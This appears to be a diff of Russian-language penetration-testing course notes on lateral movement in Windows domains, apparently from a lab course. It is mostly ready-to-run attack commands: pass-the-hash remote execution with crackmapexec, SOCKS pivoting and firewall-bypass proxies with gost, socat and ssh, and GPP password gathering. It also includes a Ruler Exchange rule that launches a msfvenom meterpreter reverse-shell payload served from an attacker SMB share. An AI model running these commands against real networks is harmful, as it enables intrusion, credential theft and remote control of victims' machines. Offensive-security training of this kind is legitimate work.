@@ -1516,18 +1516,24 @@ $ ntlmrelay.py -t DCSYNC://DC01.mic.local -smb2support
 
 Занятие 12
 
-хинт мб 70 машина с анонимным ftp
 с доменной учеткой можно делать керберостинг, асрепростинг, ремов мик,
 
 Сканируем максимально широко!
+
+План
+1. Wireshark
+2. Сканирование
+3. Пробив
+4. Сбор loot (повышение)
+5. Достижение цели
 
 
 
 Достижение цели
 
-Ищем машины с двумя интерфейсами
-$ crackmapexec smb <ip>/24 -u Administrator -H <hash> -x "ipconfig"
-$ crackmapexec smb <ip>/24 -u Administrator -H <hash> -x "netstat "
+Ищем машины с двумя интерфейсами (возможно они ведут в закрытые сегмены)
+$ crackmapexec smb <192.168.1.0>/24 -u Administrator -H <hash> -x "ipconfig"
+$ crackmapexec smb <192.168.1.0>/24 -u Administrator -H <hash> -x "netstat -ano | findstr 192.168.1.0"
 
 
 
@@ -1537,19 +1543,23 @@ Gost
 https://github.com/ginuerzh/gost
 https://docs.ginuerzh.xyz/gost/en/	Wiki
 
-На 192.168.1.1
-gost.exe -L socks5://:8081
+Атака
+На жертве
+C:\> gost.exe -L socks5://:8081
 На kali
-./gost -L socks5://:8080 -F socks5://192.168.1.1:8081
+$ ./gost -L socks5://:8080 -F socks5://192.168.1.1:8081
 
-msf6> set proxies
+Запускаем msf через прокси
+msf6> set proxies socks5://192.168.1.1:8080
 
 Более длинная цепочка
 gost -L=socks5://:8080 -F=socks5://192.168.1.1:8081 -F=socks5://192.168.1.2:8082 -F=socks5://192.168.1.3:8083 
 
 
 
-Реальный сценарий (reverse proxy, что бы обойти нат и фаерволл)
+Реальный сценарий 
+reverse proxy, что бы обойти нат и фаерволл
+
 На сервере с белым IP (195.230.102.1)
 $ gost -L socks5://0.0.0.0:1337
 
@@ -1567,12 +1577,13 @@ gost -L=tcp://:2222/192.168.1.1:22
 Proxychains
 https://github.com/haad/proxychains
 
+Отключаем уведомленя от proxychains
 $ proxychains <msfconsole> 2>/dev/null
 
 
 
-Tsocks (Не очень стабильный, но при сканировании работает в сотни раз быстрее чем proxychains)
-/etc/tsocks.conf
+Tsocks (Мастхев при сканировании, но не очень стабильный)
+Конфиг - /etc/tsocks.conf
 $ export LD_PRELOAD=libtsocks.so; nmap 192.168.1.1 -sT 	Опция sT нужна что бы работать через прокси
 
 
@@ -1584,33 +1595,64 @@ https://www.radarhack.com/tutorial/DEFEATING_THE_NETWORK_SECURITY_INFRASTRUCTURE
 Port forward over SOCKS4:
 127.0.0.1:3389 -> 192.168.1.100:3389 over socks 127.0.0.1:9999
 
-socat TCP4-LISTEN:3389, fork
+socat TCP4-LISTEN:3389, fork (можно повесить stdin stdout прложения на порт)
 SOCKS4:127.0.0.1:192.168.1.100:3389, socksport=9999
 
-socks proxy over ssh
-$ ssh -D 31337 user@192.168.1.1
+
+
+Прокси через ssh
+1. Подключаемся к хосту по ssh с -D
+$ ssh user@192.168.1.1 -D <31337>
+2. Добавляем в /etc/proxychains4.conf
+	socks5 127.0.0.1 <31337>
+3. Выполняем команды через прокси
+$ proxychains <command>
 
 
 
-SCCM 
+SCCM
+https://github.com/PowerShellMafia/PowerSCCM
+https://www.youtube.com/watch?v=-ZlQKyh0EGs
+
+ 
 
 ZABBIX
 Система мониторинга 
 можно исполнять код на машинах (любые архитектуры)
-https://youtube.com/v=Vw_Av
+https://www.youtube.com/watch?v=Vw_AvSlB7f0
 
 
 
 RULER
+Работает с Exchange (Outlook)
+Получаем доступ на машину из изолированного сегмента, если мы скомпрометировали его учетку
 https://github.com/sensepost/ruler
-youtube.com/watch?v=C07GS4M8BZk
+https://www.youtube.com/watch?v=C07GS4M8BZk
+
+Основные команды:
+display - перечислить все текущиие правила
+add	- добавить правило
+delete	- удалить правило
+brute	- брут учетных данных
+send	- отправить имейл для запуска шелла
+abk 	- взаимодействе с GAL
+form	- выполнение сценария с помощью пользовательских форм
+help	- экран помощи
 
 
 mail.ruler.local
-./ruler -k --verbose --email i.ivanov@ruler.local --username i.ivanov --hash 7395bbfcb39adb3ca48c54663201266f add --location '\\198.18.245.13\kek\meter.exe' --trigger "kekpek4" --name maliciousrule4 --send --subject kekpek4
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=198.18.245.13 LPORT=4567 -f exe -o meter.exe
-sudo smbserver.py kek . -smb2support
+$ ./ruler -k --verbose \
+--email i.ivanov@ruler.local \
+--username i.ivanov \
+--hash 7395bbfcb39adb3ca48c54663201266f \
+add \
+--location '\\198.18.245.13\kek\meter.exe' \
+--trigger "kekpek4" \
+--name maliciousrule4 \
+--send --subject kekpek4
 
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=198.18.245.13 LPORT=4567 -f exe -o meter.exe
+$ sudo smbserver.py kek . -smb2support
 
 
 
@@ -1629,6 +1671,11 @@ post/windows/gather/credentials/gpp
 Через модули cme
 $ cme smb 192.168.1.2 -u Administrator -H <hash> -M gpp_autologon
 $ cme smb 192.168.1.2 -u Administrator -H <hash> -M gpp_password
+
+
+
+Директория, в которую могут писть все (В реальной среде это будет нашей рабочей папкой)
+C:\Users\Public
 
 
 
